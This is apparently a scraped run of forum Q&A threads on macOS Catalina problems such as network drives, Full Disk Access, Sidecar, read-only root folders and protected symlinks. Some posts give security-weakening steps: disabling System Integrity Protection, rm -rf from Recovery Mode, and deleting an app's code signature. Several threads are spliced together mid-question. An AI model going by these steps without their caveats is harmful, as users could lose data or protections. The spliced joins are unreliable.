No AHT. I did the same thing on another machine - an Air, and it loaded the AHT, but said \"Machine not supported\", when I tried to run it, (which makes sense since the AHT is for a different model). I was able to capture the screen by taking a video of the process and then selecting the still frame. It goes by in less than half a second.\n\n\nA: Let's see if we can get Apple Hardware Test working from a bootable USB drive.\nThe steps to do this are as follows:\n\n\n*\n\n*Create a bootable USB flash drive by using Disk Utility's Erase function. Make sure you choose OS X Extended for the format and the GUID Partition Map for the scheme. For the purposes of these steps, also give your USB the name AHT when you're erasing it.\n\n*Now download the AHT for your particular Mac (i.e. AHT 3A238) from Apple here\n\n*Mount the downloaded image (it should mount as AHTCOne)\n\n*Now you will need to copy the AHT to your USB flash drive. To start, Launch the Terminal app (usually found within the Utilities folder)\n\n*In the Terminal window, enter the following:\ncp -r /Volumes/AHTCOne/System /Volumes/AHT/\n\n*Now we need to make the USB flash drive bootable, so enter the following line in Terminal:\nsudo bless --folder /Volumes/AHT/ --file /Volumes/AHT/System/Library/CoreServices/.diagnostics/diags.efi --label AHT\n\n*Enter your Admin password\n\n*Leave the USB flash drive plugged in and restart your Mac\n\n*Immediately hold down the Option key\n\n*Select the AHT option from the list and boot up\nNow test to see if your Mac can run Apple Hardware Test or not.\n\nNOTE for other readers: \n\n\n*\n\n*Different Macs require different versions of Apple's diagnostic software. So this answer will not apply to you unless your Mac also requires AHT 3A238. Note: Macs introduced after June 2013 use Apple Diagnostics instead.\n\n*Likewise, the Terminal commands used in this answer are for this specific question. \n\n*However, assuming you have downloaded the AHT version for your Mac, then this answer can be adapted for your use by replacing the AHTCOne with whatever name your downloaded disk image mounted as at Step 3. For example, if at step 3 your downloaded disk image mounted as AHTCThree, then at Step 5 you would use AHTCThree instead of AHTCOne within the Terminal command.\n\n", "Q: How to stop Catalina from continually telling me I need to sign in again?

This happens on both my Macs\nHow do I fix this so it stops asking?\n\nA: If signing in several times doesn’t resolve this and you can’t or won’t wait it out, signing out completely appears to get this prompt to go away. \n\n\n*\n\n*iCloud Keychain refuses to setup on Catalina\nYou do of course have to deal with the side effects of signing out like choosing to delete or keep local copies of iCloud data and then setting up your iCloud preferences and settings. \nIf you have a good backup, you could also try force quitting the system preferences app before you log out of the account. \n", "Q: What is a syncstatus.plist I have some actions I see on a Mac computer, \nspecifically----> Move \"syncstatus.plist\".\nWhat exactly is syncstatus.plist \nIs it an iPhone backup or something???\n\nA: A .plist file is just a \"preference\" file that contains your preferences for whatever application the preference file relates to.\nYour question doesn't provide any details on why your performing these actions, but typically by moving a preference file (i.e. the .plist file) for a particular application and then relaunching that application you are starting afresh as none of your previous settings are kept. \nThat is, when the .plist file is not where it's supposed to be, the application will create a new one from scratch. So, moving the .plist file is often a troubleshooting step used to correct problems a user may be having with an application.\nNote: Many guides recommend you trash the .plist file, but it's actually best to just move it somewhere first (e.g. to your desktop) and then to test whether that has actually resolved the problem. If it hasn't, you can then quit the application and move the original .plist file back so that you don't need to reconfigure everything again for the application.\n", "Q: Restore Access to File System for Emacs on MacOS Catalina I upgraded to macOS Catalina and see that applications now need to be permitted to access the file system, even the shell running inside Terminal. \nI work extensively in Emacs which seems to have lost access to the file system. Unlike with other applications, no popup appears to allow the access  for Emacs.\nHow can I restore file system access for Emacs?\n\nA: I solved the problem by granting Full Disk Access to /usr/bin/ruby as suggested here. Quoting from the reply,\n\nEmacs.app actually launches using a ruby script. As a result, MacOS Catalina uses the permissions set for ruby, not the permissions for Emacs.app.\n\nGrant access as follows.\n\n\n*\n\n*Go to \"System Preferences -> Security & Privacy -> Privacy\"\n\n*Select Full Disk Access from the left menu. It is about half way down in the menu. A list of apps will appear in the main region of the window.\n\n*Click the lock on the lower left and authenticate in order to allow making changes.\n\n*Click the + button under the list of software and select /usr/bin/ruby.\n\n\n*\n\n*/usr is usually a hidden folder and may not appear by default. If so, press shift+cmd+. (the last one is a dot) at the root directory to make it appear.\n\n\n\nEmacs.app should now be able to access the file system without any hindrance!\n\nA: This is caused by the Privacy features introduced with macOS Mojava and expanded with macOS Catalina. Essentially apps are sandboxed and not allowed to access the full disk, unless you give them that permission.\nYou can give an application access to the full disk like this:\n\n\n*\n\n*Open System Preferences\n\n*Click Privacy & Security\n\n*Choose the Privacy tab\n\n*Select Full Disk Access in the lift on the left\n\n*Click the lock in the bottom left corner to unlock\n\n*Drag the application into the list on the right\n\n\nThe next time you launch the application, it will have access to the full disk.\nThe standard emacs supplied with the system is run through Terminal.app. If you're using emacs like this (with the system supplied or for example an installation from HomeBrew or MacPorts), you need to drag Terminal.app on to the list to give access.\nIf you're using a third party GUI-based Emacs, you'll need to drag the .app for that program on to the list.\nNote that some Emacs \"distributions\" package together a number of Emacs binaries for various macOS versions in a single folder, and dynamically at runtime chooses the right one for your system. This means that the icon you click to start the program is really a \"placeholder\" that is not Emacs itself, but rather just starts up Emacs. This \"placeholder\" often takes the form of a Ruby script. If this is the case, you'll need to drag the Ruby program on to the list.\nRuby comes with macOS by default. You can find the program by opening Finder, and then from the \"Go\" menu choose \"Go to Folder\". Enter \"/usr/bin\" and you'll get that folder opened in Finder. In the folder, you'll find the ruby program that you can drag on to the Full Disk Access list.\n\nA: Emacs.app actually launches using a ruby script. As a result, MacOS Catalina uses the permissions set for ruby, not the permissions for Emacs.app. Granting /usr/bin/ruby full disk access in \"General Settings -> Security & Privacy -> Privacy\" should resolve your issue.\n/usr is hidden by default on MacOS but you can toggle visibility in the Finder by using Shift+Command+Period\n\nA: The file system permission issue is only one of the issues which are occuring due to the indirect execution of the Emacs binary via a ruby script. The best solution I found was to simply replace the startup script with the right binary for Catalina as described in https://spin.atomicobject.com/2019/12/12/fixing-emacs-macos-catalina/. Basically all you have to do is\ncd /Applications/Emacs.app/Contents/MacOS\nmv Emacs-x86_64-10_14 Emacs\nrm -rf ../_CodeSignature\n\nBesides fixing the file system issue this ensures that the Emacs window will be properly brought to front when switched to via spotlight and also ensures that only one Emacs instance gets started if you open an associated file via Finder.\n", "Q: macOS Catalina external displays are black but I can move the cursor on them I just updated to macOS Catalina. I have two external displays that only show a black background. I can see the cursor moving on them, but no windows or dock. If I try to move windows from my MacBook Pro on the screens, I only see the cursor on the external display. \nAny ideas on how I might resolve this??\n\nA: I just had the same problem. In order to fix this, go to System Preferences->Security&Privacy->Privacy, scroll down the left list until you find ScreenRecording and make sure DisplayLinkUserAgent is checked. After you check it, restart your machine and everything should be ok.\n\n\nA: Same problem here. External display connected via a Startec dock, and I can move the cursor, but no other video displays. Eventually, the monitor just turns off. I removed it from the Dock, and just did a straight USB-C to HDMI and USB-C to DisplayPort cable and it still didn't work.\nUPDATE: macOS, despite attempting to connect without the Dock, may still have been trying to use the connection software from my Dock. Turns out, in Catalina, you have to approve the system preference for your Dock. System Preferences > Security and Privacy > Screen Recording. Make sure your display driver (which might be listed there) is checked off to allow screen recording, which may be necessary for your display to work, especially if you have a Dock.\n\nA: If the other answers don't work for you, the thing that works for me is opening Terminal.app and running killall Dock, but it needs to be done after every reboot/shut down which is tedious.\n", "Q: No connection to network drive MacOS 10.15 (Catalina) I updated to Catalina today and now I cannot connect to my network drive via SMB. \nI've tried:\n\n\n*\n\n*using the ip-address, server name \n\n*the method of creating a nsmb.conf file\n\n\nRegardless, all I get is an error message stating 'There was a problem connecting to server \"name\".' \nI know the network drive is fine as I can still access the it from my phone and Windows 10.\nAny ideas how else I might try to resolve this in macOS?\n\nA: I was able to resolve this (temporarily) by restarting my Mac. I later discovered that I could restart the Finder to resolve it. Apparently the Finder app is responsible for network connections for other applications too.\nWhile this does not prevent the reoccurrence, restarting Finder is a minor inconvenience. Hopefully this is a bug that Apple will resolve.\nHow to Relaunch the Finder\n\n*\n\n*Hold the ⌥ and ⌘ keys while right-clicking on the Finder dock icon → Relaunch\n\nor\n\n*\n\n*Open  Menu → Force Quit… → Finder -> Relaunch\n\n\nA: I ran into the same issue. Some SMB servers use NetBIOS and NetBIOS is disabled by default in MacOS 10.15 (Catalina).\nhttps://medium.com/@gobinathm/how-to-access-smb-printer-shares-in-macos-catalina-10-15-17ea91d2c10b is a blog post that talks about it and lists the following steps to fix it.\nBy default, Apple has disabled NetBIOS in MacOS 10.5 to speed up SMB operations like mounting, browsing and connecting to an SMB share. If you own an SMB printer/file server from the past (i.e., legacy or old) that requires NetBIOS to connect, then these devices won’t connect by default in Catalina like the prior version of MacOS.\nIn order to access these legacy SMB systems, you need to follow the below steps.\n\n*\n\n*Check if your system has a /etc/nsmb.conf file. If one does not exist then do the following. Open the app Terminal. Type touch /etc/nsmb.conf to create the file.\n\n\n*Edit this file in your favorite editor and ensure the following lines are present in the file\n[default]\nport445=both\n\nAlternative, you can execute the below comments in your Terminal.\necho \"[default]\" | sudo tee -a /etc/nsmb.conf \necho \"port445=both\" | sudo tee -a /etc/nsmb.conf\n\nDisable NetBIOS\nSimply delete the /etc/nsmb.conf file or rename it something like nsmb.conf.old\n\nA: The method mentioned in https://medium.com/@gobinathm/how-to-access-smb-printer-shares-in-macos-catalina-10-15-17ea91d2c10b is a blog post that talks about it and lists the following steps to fix it. Should work. if this doesn't then there is some valid reason. \nI'm the original author of that medium post & have seen one failure point till now. I.e., When you have SMB network Drive (or) Printer connect & you disconnect that network. Later when you try to connect it will give an error stating unable to connect. What you need to do here is manually reconnect to that server then only it will work.\n\nA: I too had (still have) the same problem and couldn't find any solutions in the net that would work. I also could not find any OSX Catalina documentation.  However, I was able to find a (hopefully temporary) workaround.\nThis seems to be an authentication issue, and by disabling authentication requirements from my NAS folders, and selecting \"Guest\" as the mode of access, I was able to gain read/write access back to my NAS directories.\nHopefully, a better fix fill come along, at least one that won't require me to replace my NAS.\n\nA: I had the same problem and solved it in a strange way, \nAs we are all aware Mac user has actually 2 names: one is the username (the profile name if i may) and the Display name.\nPrior to Catalina , when authenticating with an SMB share from a Windows computer , I was using the display name (although it is a full name with a space) and everything was cool.\nIn Catalina , I found out I can only use the username, windows cannot authenticate with the display name.\nof course , before I got to this point I have checked/enabled SMBv2, created the NetBios file in the MAC and all the other hints I could find, which obviously did not do the trick for me.\nhope this helps\n", "Q: Duplicate keyboard input after upgrading to macOS Catalina After updating to macOS Catalina – when I type, macOS will randomly repeat keypresses and sequences of keypresses.\nBelow are some examples of some mistypes just while writing this article:\nmacOS => macOSmacOS\nBelow => Below elow\nBelow => BelBelow \nSome => SomeSome\nSome => Someome \n\nmacOS also duplicates Enter and control-sequences like Ctrl-C and CMD+V.\nAfter updating to macOS Catalina, I also updated brew with brew upgrade, so maybe I have some odd update in there that might be causing this issue?\n~ $ brew list\nallure\nansible\napr\napr-util\nargon2\naspell\nautoconf\nbash-completion\nbdw-gc\nbrotli\nc-ares\ncaddy\ncmake\ncomposer\nctags\ncurl-openssl\ndnsmasq\ndoctl\nfdupes\nfreetds\nfreetype\nfzf\ngdbm\ngettext\ngit\nglib\ngmp\ngnu-sed\ngo\ngraphicsmagick\nhtop\nhttpie\nicu4c\njansson\njasper\njemalloc\njpeg\njq\njsoncpp\nlibev\nlibevent\nlibffi\nlibidn\nlibmetalink\nlibpng\nlibpq\nlibsodium\nlibssh2\nlibtermkey\nlibtiff\nlibtool\nlibuv\nlibvterm\nlibyaml\nlibzip\nlittle-cms2\nluajit\nmariadb\nmongodb\nmsgpack\nncdu\nncurses\nneovim\nnghttp2\nnnn\noniguruma\nopenldap\nopenssl\nopenssl@1.1\npcre\npcre2\nphp\npkg-config\npython\npython3\npython@2\nrbenv\nreadline\nrtmpdump\nruby\nruby-build\nsdl2\nsdl2_image\nshellcheck\nsphinx-doc\nsqlite\nthe_silver_searcher\ntidy-html5\ntig\ntmux\nunibilium\nunixodbc\nwebp\nxz\n\nI have tried multiple different keyboards.

It is also 100% annoying when I have to do that.\nAfter the reboot I can use Sidecar wirelessly very reliably. Until I disconnect. Or change any Sidecar setting (Like: Show touch bar on/off). After that there is a good chance I have to reboot my Mac for it to work again.\n\n\n*\n\n*Why does it do that?\n\n*How do I temporarily fix that? (Say: Is there a terminal command?)\n\n*How do I permanently fix that?\n\n\nA: when you try to reconnect sidecar, you can click mirror display after connecting your iPad.After that, you will find your iPad get bright.Then canceling mirror operation.\n\nA: Toggle mirror displays on and off by pressing command-F1 twice.\n\nA: I found that if you go to display preferences -> arrangement -> tick and then untick mirror display option it will work but I would have to repeat this step every time I use sidecar :)\n\nA: In case you have multiple displays connected (and one of them is iPad), toggling mirror off/on was not working for me. What helped was to disconnect other displays and then try toggling mirroring tricks when only the iPad is connected.\n\nA: I also had this black screen problem with the wireless Sidecar connection. The iPad as an extended screen with a wireless connection started working well until it turned into a black screen today. Eventually, when the iPad is directly connected to the MacBook using the iPad charge USB cable it works well and the response speed of the iPad apparently becomes faster as well. You may need a USB adapter for your MacBook for this connection.\nEDIT\nToday after the iPad operation system is updated to a new version, the iPad as an extended screen with a wireless connection works well.\n", "Q: Photos on multiple computers Here's my scenario: I have around 60Gig of photos on my desktop Mac. That mac is backed up regularly and I consider it safe for my photos. However I would like to be able to use my iPad to decide which photos to keep, to favorite, or delete.\nI could use Apple's iCloud Photos but I have two problems:\n\n\n*\n\n*I don't want to pay for space that I already have at home\n\n*I want to know for sure that all my masters are in my possession\n\n\nI can sync my iPad with the desktop, asking for all photos, collections, etc to be synced. Now my iPad has all of them. But if I delete one on my iPad it won't delete it on my deskop. I'm not even sure that if I favorite it on my iPad that it will be favorited on my desktop.\nIs there a way to get this done without giving Apple control over all my photos? \n\nA: Use iCloud Photos. It's really nice having a single shared iCloud Photos Library between your Mac and iOS devices.\nOnce you're using iCloud Photos, any favorites / edits / deletes that you make on your iPad will be synced to your Mac.\n\nI don't want to pay for space that I already have at home\n\nYou're paying for it, but consider Apple's iCloud as another offsite backup, of which you can never have enough. Consider the cost of the subscription similar to the cost of another backup HDD at home. And it's a better backup for the photos stored on your iOS devices.\n\nI want to know for sure that all my masters are in my possession\n\nThere is a Download Originals to this Mac setting in Photos for the Mac that allows you to keep all original photos on the Mac (as opposed to downloading them on demand from the Cloud / optimizing storage).\nUsing this setting should keep your current Mac / backup setup roughly the same. Local backups of your computer will continue to back up ALL of your photos.\n\nThe originals will still be stored and backed up on your Mac.\n\nA: Create a share folder containing the photos by going into settings > share > file sharing. This will then give you an address like afp://192.168.1.2 or whichever host name your iPad has on your local network.

After the installation of Catalina all User created folders from root are moved into a separate folder and the root folder is made readonly, containing only system default folders. \nHow is it possible to undo this and to make the root folder writeable again?\n\nA: You can create a symbolic in root directory via synthetic.conf, as an example see below the creation of a symbolic link named bar at /, which points to System/Volumes/Data/bar, a writeable location at the root of the data volume.\necho -e 'bar\\tSystem/Volumes/Data/bar' | sudo tee -a /etc/synthetic.conf\n\nAfter executing the command above, you need to reboot to see effects.\nSEE ALSO\nman synthetic.conf\n\n\nA: How to create a /bar directory you can write to:\n\n\n*\n\n*echo 'bar' | sudo tee -a /etc/synthetic.conf\n\n*reboot\n\n*Run the following commands:\n\n\nsudo diskutil apfs addVolume disk1 APFSX Bar -mountpoint /bar\nsudo diskutil enableOwnership /bar\nsudo chflags hidden /bar  # Don't show the Bar volume on the desktop\necho \"LABEL=Bar /bar apfs rw\" | sudo tee -a /etc/fstab\n\nYou might need to use a different diskX number.

Last month I asked Can I toggle Do Not Disturb on/off on my Mac as easily as I can on my iPhone?\nThe answer I got was perfect and I've been easily toggling Do Not Disturb every day since, and this opened my eyes to another possibility. \nI found that while DND was active, I could still view my notifications whenever I wanted by clicking on the Notification Center icon. This is fantastic as I'm not interrupted by notifications appearing on my screen, but I can manually check them when I want.\nNow the catch! As that answers correctly says\n\nNOTE: Do Not Disturb will stay active until the next day (when it becomes inactive again) or until you once again hold the option key while clicking on the Notification Centre icon.\n\nWhat I'd now like to know is if there's a way for me to just make DND active 24/7 so I don't have to keep enabling it?\nI did check in System Preferences > Notifications and I can set it on a schedule but there is no option to just enable it and forget it.\nHow can I turn DND on until I manually decide to switch it off?\n\nA: Technically there's no default way to leave it on 24/7, but you can basically achieve the same thing.\nGo to System Preferences > Notifications and set a schedule so that it starts one minute after it ends. For example, if you have it set to start at 7am and stop at 6:59am, it'll effectively be on for 23h 59m.\nNow, because any notifications will appear for one minute, the trick is to pick a start and end time that's not when you're likely to be using your Mac. In that way, you're not going to be seeing that one minute of notifications! And, because you’ve set a schedule, it won’t turn off at midnight like it normally would.\nSee macOS User Guide: Use Do Not Disturb on your Mac on Apple's website.\nYou could also use the Energy Saver preference pane to set a schedule for when your Mac is awake/asleep and time your Do Not Disturb schedule to suit this. \nFor example, Do Not Disturb can be set to be active while the display is sleeping, so if your Mac is usually on 24/7 but asleep for most of the night, you can set your Do Not Disturb schedule so that it starts at 5am and ends at 1am. While you're awake Do Not Disturb is always on, and while you're not (but your Mac is sleeping) it's still on because its display is asleep.\n", "Q: Network error since the macOS Catalina update No internet, \"ERR_INTERNET_DISCONNECTED\" error in chrome since the macOS Catalina update. \nI tried,\n\n\n*\n\n*resetting the router\n\n*reconnecting to the wifi it in safe mode\n\n*diagnostics report\n\n\nI tried it in Safari and Chrome a few hours ago and it didn't work in both of them. Now, it isn't working in Chrome but surprisingly it is working in Safari. \nPS - Again it stopped working :( \nI can open Stack Exchange in Chrome but not other sites. What is happening?\n\nA: It's a DNS resolver problem inside the macOS. It's not picking up the DNS servers provided by the router or inputted manually in the \n\"network settings\". The actual Internet connection is still there - you can confirm through running nslookup apple.com 8.8.8.8 through the Terminal.\nThe only way to solve this as of now is to reboot the Mac. Killing the mDNSResponder doesn't help.\nI would also recommend contacting Apple Support through the chat, explain them this problem (and the solution). They will schedule a call with second line of support. You explain them the problem again and they will send a note to developers.

One big app that we use constantly and is arguably the best (free & simple) tool to automatically adjust audio levels for podcasts and any kind of recording is Levelator. There's simply no directly comparable replacement and unfortunately it's a 32-bit app that won't run on Catalina.  This is just one app that I can't live without and using a virtual machine for this one thing with such consistency is really a showstopper for \"upgrading\" to Catalina.  Sadly since the app is no longer maintained, there doesn't seem to be any hope to get a 64-bit version from the now-defunct developers.\nDoes anyone have any method to update or hack Levelator so that it'll run with Catalina since it appears to be primarily a (compiled) Python script?  \nI'm wondering if perhaps the python bin can be updated and still execute Levelator's obfuscated script?\n\nA: Perhaps not the solution you're looking for, in that it is not free (the \"Basic\" plan is $6/mo), but Landr offers a great online tool to \"Master\" all audio, add levels, tone, warmth, etc.  Hope some of this helps.\n\nA: Amadeus is an audio editing software I've used for many years. They have a menu option Effects ==> Audio Units ==> AUDynamicsProcessor that does what Levelator did, and it takes only a few seconds instead of a few minutes to process the file. I run it through that effect twice and then Amplify the sound to my preferred level afterward. This is great for podcasting recordings where two people ended up at very different sound volumes in the file.\nCheck it out.

Inside this folder is a PDF explaining what these items are.\nInside the folder are two sub-folders - Configuration and Security. These folders contain items that were in locations which are no longer compatible with the new macOS configuration. You are advised to review the items in these directories and take appropriate action.\nThe problem is that within the Security/usr folder is a symbolic link called X11 pointing to /opt/X11. The /opt/X11 directory does not exist and I cannot remove the X11 link with either unlink or rm (as sudo and have tried after sudo su to get a root shell). When I try to remove the file, I get \"Operation not permitted\". I can move the link to the Trash, but when I do, trying to empty Trash results in an error saying it cannot be emptied because X11 is a file required by macOS. So, how do I get rid of this link?\nUpdate: I also noted that xattr shows nothing.\n\nA: I used the procedure found at MacReports.com:\n\n\n*\n\n*boot into Recovery Mode,\n\n*disable csrutil,\n\n*reboot,\n\n*delete the folder (in either the Finder or Terminal),\n\n*reboot into Recovery Mode,\n\n*re-enable csrutil; and,\n\n*reboot.\n\n\nFour reboots (!), yes -- but so far, so good.\n\nA: As this questi9on has had over 1k views, it seems it is a common issue. Therefore, I thought I would outline what I did to get it resolved in case others find it useful. \nWhen I first tried to remove the link, I was told the operation was not permitted. Looking at the link, I could see it was owned by 'root' and in the 'wheel' group. I therefore then tried to remove it with sudo i.e.\nsudo unlink X11\n\nThis failed with the same error. I also tried \nsudo rm -rf X11\n\nbut this also failed with the same error. I then posted here asking for help and @Danijel-JamesW added a comment with a link to a useful article which provided some background on the new security features initially introduced in the previous version of macOS, but extended in Catalina. One of the things this article highlights is that some applications, like terminals and editors (in my case Emacs), need to have the full disk access privilege. Without this privilege, you will often get operation not permitted errors in unexpected locations/situations. Unfortunately, this was not the issue in my case. My terminal app (iTerm2.app) had the necessary permissions. However, the article did indicate that you could also get around the operation not permitted error by disabling SIP (System Integrity Protection). This was going to be my next move. However, in the end it was not necessary. \nThanks to a comment from @user3439694 I found out that you can boot into recovery mode and use the terminal to delete the file. THis is what I did\n\n\n*\n\n*Boot holding down commmand + R\n\n*Click on Utilities and select Terminal from the top menu\n\n*Enter rm -rf /path/to/file/to/remove\n\n*Reboot\n\n\nThis solved my issue. One important thing to note is that working in the recovery terminal is powerful and potentially dangerous. You need to make sure you are deleting what you mean to delete. To be extra safe, instead of immediately issue the rm command, you can use ls -l to make sure you have the correct file or directory and then hit the up arrow to bring back the command from the history, move to the beginning of the line, remove the ls -l and type rm -rf, leaving the path unmodified following the rm -rf. Note also that the -r means recursive and -f means force - very powerful and dangerous. It will essentially remove everything from the point specified in the path downwards i.e. all sub directories and files. So, if you get that path wrong, you may end up deleting much more than you expected to.  In my case, the path I needed was \n/Volumes/Macintosh\\ HD\\ -\\ Data/Users/tim/Desktop/Relocated\\ Items\n\nmy login account is 'tim'. the '\\ ' are needed to escape the spaces in the path. Most systems will have the path starting with /Volume, but the drive name may differ (i.e. Macintosh HD). the '- Data' is fairly standard. \nAnyway, this fixed the issue and those irritating files are now gone and my Desktop folder is clean (for now!). \n\nA: Tim X's solution worked for me. The tl;dr is\n\n*\n\n*Recovery mode: command + R\n\n*Utilities -> Terminal\n\n*rm -r /path/to/file/or/dir/to/remove (The -r alone worked for me -- Tim used rm -rf force mode)\n\n*Reboot\n\n\nA: The issue is caused by X11 symlink which is setup by XQuartz and this points to X11 folder which is protected by Mac OSX. At some point you might have installed XQuartz and the original procedure is to uninstall XQuartz and reinstall XQuartz after Catalina upgrade.\nIn my case, I had installed XQuartz via homebrew cask and had already upgraded to catalina. So firstly, uninstall XQuartz.\n$ brew cask ls\n$ brew cask remove xquartz\n\n\n\n*\n\n*now restart your mac\n\n*hold \"cmd + r\" (you can release the keys after a few seconds just after apple logo appears with the progress bar)\n\n*now you are in recovery mode\n\n*select from the top menu utilities > terminal\n\n*enter the following to disable apple secure integrity\n\n\n$ csrutil disable       # this disables apple secure integrity tool \n\n\n\n*\n\n*close the terminal\n\n*select from the top menu restart and wait for normal boot into your account\n\n*now you can delete the files which are stuck and bin them as usual\n\n*for completness, reboot into the recovery mode as above steps and in the terminal enter\n\n\n$ csrutil enable       # this reenables apple secure integrity tool\n\n\n\n*\n\n*restart and login as usual\n\n\nif you are freaking out as you are being warned of deleting/binning a protected folder, you can opt to use \"unlink X11\" command instead to remove the symlink. this worked for me and hope it helps.\nto understand or test the issue you can try the following which in the case of trying to disable system integrity results in an error\n$ csrutil status\nSystem Integrity Protection status: enabled.\n$ csrutil disable\ncsrutil: failed to modify system integrity configuration. This tool needs to be executed from the Recovery OS.\n\n\nA: I personally don't like to turn off SIP/security features, if I can help it.\nThe way I do this is as follows:\n\n*\n\n*Reboot and immediately hold down cmd+r (booting into recovery mode)\n\n*Open Disk Utility (you likely have to select your admin user and login first)\n\n*Mount your data volume (e.g. Macintosh HD - Data)\n\n*Quit Disk Utility\n\n*In the toolbar, open Terminal (Utilities->Terminal)\n\n*rm -rf /Volumes/Macintosh\\ HD\\ -\\ Data/Users/[your-user]/[path-to-relocated-items]\n\n*reboot\n\nYou should not have to disable SIP/csrutil.\n\nA: Having struggled with all the advice, and sudos, suddenly I had this idea....: what if...? And yes!\nI just moved everything from the Trash bin to my Dropbox folder (which apparently was allowed, nothing protested) and subsequently deleted the whole bunch of stubborn files via Dropbox' online interface. And they were gone!\nHave a nice day,\nPaul\n", "Q: Catalina Update Fail Purgeable Storage Catalina update failled mid-way and is stuck due to lack of available disk space.

I just switch to use the bash shipped by homebrew (currently v5.0.18), which will incidentally also remove that deprecation warning.\nSteps:\n\n*\n\n*Install Homebrew if you haven't already.\n\n*Install the latest bash shell with Homebrew:\n\nbrew update && brew install bash\n\n\n\n*If you have an Apple Intel computer, change the shell like this:\n\nsudo chsh -s /usr/local/bin/bash $(whoami)\n\nOr if you have Apple Silicon (e.g. M1):\nsudo chsh -s /opt/homebrew/bin/bash $(whoami)\n\n\nA: I found the solution on reddit. The solution is also mentioned in the \"How to use a different shell without changing the default\" section of the Apple support article mentioned in the bash warning: https://support.apple.com/en-us/HT208050/.\nAdd:\nexport BASH_SILENCE_DEPRECATION_WARNING=1\n\nto $HOME/.bash_profile, $HOME/.profile or $HOME/.bashrc and restart iTerm. After that, the warning message will be gone.\n\nA: I found that becoming root, then adding the deprecation suppression in /etc/profile was more reliable. I was already using ZSH and I was getting the warning every time I opened a new console. Terribly annoying. /etc/profile now reads as follows:\n\n    # System-wide .profile for sh(1)\n    export BASH_SILENCE_DEPRECATION_WARNING=1\n    \n    if [ -x /usr/libexec/path_helper ]; then\n            eval `/usr/libexec/path_helper -s`\n    fi\n    \n    if [ \"${BASH-no}\" != \"no\" ]; then\n            [ -r /etc/bashrc ] && . /etc/bashrc\n    fi\n\n\nA: If you are using (as the biggest part of us) iTerm as a teminal emulator and since the bash shipped with osx is rather old the best solution (IMHO) is to configure iTerm to use brew bash and leave the default system shell to whatever else configured by the system (unless you have a reason to do otherwise).\nThe pros are that if accidentally brew get removed the shell stuff related to your account will continue to work.\nThe cons are that script executed at boot or at login still use the original (old) bash. This can be a problem or a \"feature\". Surely those who have these types of problems also know how to solve them.\nTo do so the steps are:\n\n*\n\n*install brew\n\n*install bash using brew\n\n*configure iTerm to execute brew bash when you open a new window (or tab)\n\nThe defaul shell for iTerm can be configured on profiles.\nFor example to change shell for Default profile:\n\n*\n\n*Open Preferences (menu iTerm -> Preferences)\n\n*Select the pane with Profile configurations\n\n*Select the desired profile\n\n*Select \"General\" tab\n\n*Under \"Command\" select \"Custom Shell\" from pop-up\n\n*Type the path to your shell (/usr/local/bin/bash or /opt/homebrew/bin/bash)\n\n", "Q: Bootable SSD and converting to APFS I boot my iMac from an external SSD, which is a clone of my main HDD, running Mojave. I had no issues before, recently with the Catalina being released I downloaded the update and when I choose my SSD drive I get: \"this volume is not formatted as APFS\".\nWhat should I do now? I tried from recovery to convert it, but the option is disabled.\nIs the only way to format it? or is there another way I am not aware of?\n\nA: It turns out there was no way to change my SSD to APFS without formating. \nI ended up using \"carbon copy cloner\" cloned my SSD to internal hard drive, then formatted my SSD to APFS, and cloned everything back to SSD. All good now and I was able to upgrade without trouble.\n\nA: Let's find out why Disk Utility isn't letting you convert your partition. In the Terminal, use diskutil list to determine the device node name for the HFS partition you want to convert (e.g. disk1s2) and then use diskutil apfs convert <device> -dryrun, e.g. diskutil apfs convert disk1s2 -dryrun. If it fails, edit your question, adding the output of that command.\nIf the dry run succeeds, then actually attempt the conversion with diskutil apfs convert <device>, e.g. diskutil apfs convert disk1s2. Again, if that fails, edit your question, providing the output.\nAs with any situation where you're messing with partitions, ensure you have a backup of your data beforehand.\n", "Q: Retrieve Current iPhone Lock Screen Live Photo Wallpaper I have an iPhone X running iOS 13.1.2 I currently have a lock screen wallpaper which is a live photo i got from an app when I first got the phone. I no longer have the image saved, and can't find the image again in any app or online. Is there a way to somehow access the current lock screen wallpaper while retaining the Live Photo?\n\nA: I don't know of a way, but you can take a screen shot while in lock screen.\nAnd if your unlocked screens have the same background, you can create a screen page with only one app on it, and take a screen shot of that.  In fact, when I tried it, I accidentally left the one app on its original page, so the page was empty.\nThen use a graphic editor to combine the two, thereby removing much of the clock and the app icon.\nI took the top half of the empty app page (no big clock) and the bottom half of the empty app page (no dock) to get the image below.\nThen if you put the resulting image into reverse image search, you might get the original image.\n\n", "Q: How to create sha-512 password hashes on Mac for CentOS?

Until Xcode 10 I was able to move the Xcode Library/Developer folder to an external drive using a symlink, in order to free up space on my main disk, like\nln -s /Volumes/*/Library/Developer /Users/*/Library/Developer\n\nIn Xcode 11, moving the Developer folder produces errors related to my .xib files, like\n/Users/*project_directory*/objects/View.xib:1:1: Failed to find or create execution context for description '<IBCocoaTouchPlatformToolDescription: 0x7fbc697f2a20> System content for IBCocoaTouchFramework-ElevenAndLater <IBSimulatorDeviceTypeDescription: 0x7fbc68ecd0c0> deviceType=com.apple.CoreSimulator.SimDeviceType.iPhone-8'. These intermediate objects were non-nil: ( …\n\nRestarting the CoreSimulatorService, which is often proposed as the solution for this kind of errors, doesn't work in this case.\n\nA: Well, might be a strech to call this an answer, but most of the stuff that requires hd space on a modern Xcode installation is located in your\n$ ~/Library/Developer\n\ndirectory (mostly simulator files), and within the Xcode app bundle itself, in my case Xcode alone needs 10 gigabyte plus around 6 gigabyte for the simulator files and only 1.3 gigabyte in /Library/Developer.\nI also do some Flutter development, so that is another 10 gigabyte for the Android sdk and 4 gigabyte for the emulator files, plus a couple for Flutter itself.\nAll those directories have been symlinked or aliased and works just fine on an external drive.\nThis is described in my answer regarding moving Xcode and friends to an SSD drive.\nI also got some problems using brew when I moved the /Library/Developer stuff, so it's probably best to leave that wormhole alone and focus on moving the things that does take a lot of space.\nIf you've already messed it up, just install the command line package again using the xcode-select command as described in my other post and go through those steps that fits your setup.\nI save around 50 gigabyte ++ on the system drive by using this method with Xcode, the simulator and all, and I don't have the problem you mentioned in your question. I've been doing this for a couple of years now. So it IS possible, even if I can't pinpoint why it's not working for you.\nIf you update the question, documenting:\n\n*\n\n*the file system in use on the external drive\n\n*mount options you use for mounting it\n\n*if you use FileVault or not on the system\n\n*have you tried repairing the permissions on your whole user directory while booting into recovery mode? (In the terminal)\n\nI'd have a bit more to work with probably.\nBut as of now I can't reproduce what you experience.\nAlso try using a good old \"alias\" for the developer directory, don't use the command line to make a symlink, just hold down the option and command keys while dragging the Developer directory 